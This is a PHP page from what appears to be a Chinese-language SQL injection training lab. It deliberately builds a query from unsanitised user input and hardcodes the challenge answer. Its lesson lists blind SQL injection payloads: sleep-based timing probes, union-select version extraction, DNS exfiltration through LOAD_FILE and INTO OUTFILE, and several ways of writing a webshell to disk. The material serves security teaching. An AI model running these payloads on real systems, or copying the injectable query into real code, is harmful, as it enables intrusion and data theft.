<?php


session_start();
if(!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true){
    header("location: /account/login.php".(isset($_SERVER['REQUEST_URI'])?"?redirect=".$_SERVER['REQUEST_URI']:""));
    exit;
}





if($_SERVER["REQUEST_METHOD"] == "GET" && isset($_GET["id"]) ){
	// $input_id = preg_replace('/\s+/', '', $_POST["id"]);
	$input_id =  $_GET["id"];
	

    $sql = "SELECT * FROM user_data WHERE userid ='$input_id' LIMIT 0,1 ";
    
	
	include('config.php');
	if($result = mysqli_query($link_select, $sql)){
		if(mysqli_num_rows($result) > 0){
			$result_row = $result;
			$challenge_array = array('success',' SQL query 成功，有 select 資料');
        }else{
            $challenge_array = array('success',' SQL query 成功，無 select 資料');
        }
    }else{
		$challenge_array = array('alert','  SQL query 失敗，可能是語法錯誤');
    
    }

}else if($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["answer"])){
	$input_answer= $_POST["answer"];
	if($input_answer=="5.7.13"){
	    $user_id = $_SESSION["id"];
        $challenges_name = "SQL-Injection-Blind-1";
        include('../challengesConfig.php');
        include_once('../challenges.php');
        $challenge_array = CheckChallenges($link,$user_id,$challenges_name);
    }else{
        $challenge_array = array('alert',' 答案錯誤');
    
    }
	
}
$challenge_type =  $challenge_array[0];
$challenge_messange =  $challenge_array[1];



?>

<?php
    $titlename='Blind SQL injection';
	include_once('../../php-inc/header.php');
?>


<h1>Blind SQL injection</h1>

<ul>
    <li>看不到的回顯的 SQL injection</li>
</ul>


<ul>
    <li>字串擷取
        <ul>
            <li>SUBSTRING('feilin', 4, 2) --> li </li>
        </ul>
    </li>
    <li>條件
        <ul>
            <li> SELECT IF(1=1,1,2) 如果 1=1 就印出 1 不是就印 2</li>
            <li> SELECT IF(1=1,(SELECT table_name FROM information_schema.tables),'a') </li>
        </ul>
    </li>
    <li>多條執行
        <ul>
            <li>QUERY-1-HERE; QUERY-2-HERE </li>
        </ul>
    </li>
    <li>延遲
        <ul>
            <li>SELECT sleep(10) </li>
            <li>SELECT IF(1=1,sleep(10),'a') </li>
        </ul>
    </li>
    <li>查看 DNS
        <ul>
            <li>LOAD_FILE('\\\\DNSBIN\\a')</li>
            <li>SELECT ... INTO OUTFILE '\\\\DNSBIN\a'</li>
        </ul>
    </li>
    <li>LEAK 資料
        <ul>
            <li>SELECT 要挖的資料 INTO OUTFILE '\\\\DNSBIN\a'</li>
        </ul>
    </li>
    <li>WEBSHELL
        <ul>
            <li>into outfile
                <ul>
                    <li>SELECT "WEBSHELL_CODE" INTO OUTFILE 'C:/wamp64/www/work/webshell.php'</li>
                </ul>
            </li>
            <li>lines terminated by：以每行結束的地方寫入
                <ul>
                    <li>into outfile 'C:/wamp64/www/work/webshell.php' lines terminated by 'WEBSHELL_CODE';</li>
                    <li>limit 1 into outfile 'C:/wamp64/www/work/webshell.php' lines terminated by 'WEBSHELL_CODE';</li>
                </ul>
            </li>
            <li>lines starting by：以每行開始的地方寫入
                <ul>
                    <li>into outfile 'C:/wamp64/www/work/webshell.php' lines starting by 'WEBSHELL_CODE';</li>
                    <li>limit 1 into outfile 'C:/wamp64/www/work/webshell.php' lines starting by 'WEBSHELL_CODE';</li>
                </ul>
            </li>
            <li>fields terminated by：以每個字段開始的地方寫入
                <ul>
                    <li>into outfile 'C:/wamp64/www/work/webshell.php' fields terminated by 'WEBSHELL_CODE';</li>
                    <li>limit 1 into outfile 'C:/wamp64/www/work/webshell.php' fields terminated by 'WEBSHELL_CODE';
                    </li>
                </ul>
            </li>
            <li>COLUMNS terminated by：以每欄位開始的地方寫入
                <ul>
                    <li>into outfile 'C:/wamp64/www/work/webshell.php' COLUMNS terminated by 'WEBSHELL_CODE';</li>
                    <li>limit 1 into outfile 'C:/wamp64/www/work/webshell.php' COLUMNS terminated by 'WEBSHELL_CODE';
                    </li>
                </ul>
            </li>




        </ul>
    </li>
</ul>


<div>
    <h2>Blind SQL injection</h2>
    <ul>
        <li>請利用二分搜尋法嘗試找到伺服器版本
            <ul>

                <li>' order by 1 -- # --> 確認有幾個欄位</li>
                <li>' order by 8 -- # --> 確認有幾個欄位</li>
                <li>SUBSTRING(@@version, 1, 1)</li>
                <li>' union select NULL,NULL,NULL,NULL,NULL,NULL,if(SUBSTRING(@@version, 1, 1)=4,sleep(10),NULL) -- #
                </li>
                <li>' union select NULL,NULL,NULL,NULL,NULL,NULL,if(SUBSTRING(@@version, 1, 1)=5,sleep(10),NULL) -- #
                </li>
            </ul>
        </li>
        <li>
            狀態
            <ul>
                <li>有成功執行 SQL 語法，也有撈到資料</li>
                <li>有成功執行 SQL 語法，無撈到資料</li>
                <li>SQL 語法執行錯誤</li>
            </ul>
        </li>
    </ul>
    <pre class="hljs"
        style="display: block; overflow-x: auto; background: rgb(235, 248, 255); color: rgb(81, 109, 123); padding: 0.5em;"><span class="hljs-keyword" style="color: rgb(107, 107, 184);">SELECT</span> * <span class="hljs-keyword" style="color: rgb(107, 107, 184);">FROM</span> <span class="hljs-keyword" style="color: rgb(107, 107, 184);">user_data</span> <span class="hljs-keyword" style="color: rgb(107, 107, 184);">WHERE</span> userid =<span class="hljs-string" style="color: rgb(86, 140, 59);">'$input_id'</span> <span class="hljs-keyword" style="color: rgb(107, 107, 184);">LIMIT</span> <span class="hljs-number" style="color: rgb(147, 92, 37);">0</span>,<span class="hljs-number" style="color: rgb(147, 92, 37);">1</span> </pre>


    <form method="GET" name="form" action="">
        <div class="input-group mb-3">
            <input id="id" name="id" type="text" class="form-control" placeholder="id" aria-label="請輸入id"
                aria-describedby="basic-addon2">
            <div class="input-group-append">
                <button class="btn btn-outline-secondary" type="submit">送出查詢</button>
            </div>
        </div>
    </form>

</div>



<h2>小試身手</h2>
    <p>請利用二分搜尋法嘗試找到伺服器版本</p>
 
    <form method="POST" name="form" action="">
        <div class="input-group mb-3">
            <input id="answer" name="answer" type="text" class="form-control" placeholder="回答問題，請一次輸入一個答案"
                aria-label="回答問題" aria-describedby="basic-addon2">
            <div class="input-group-append">
                <button class="btn btn-primary  " type="submit">送出答案</button>
            </div>
        </div>
    </form>


<?



include('../../php-inc/footer.php')


?>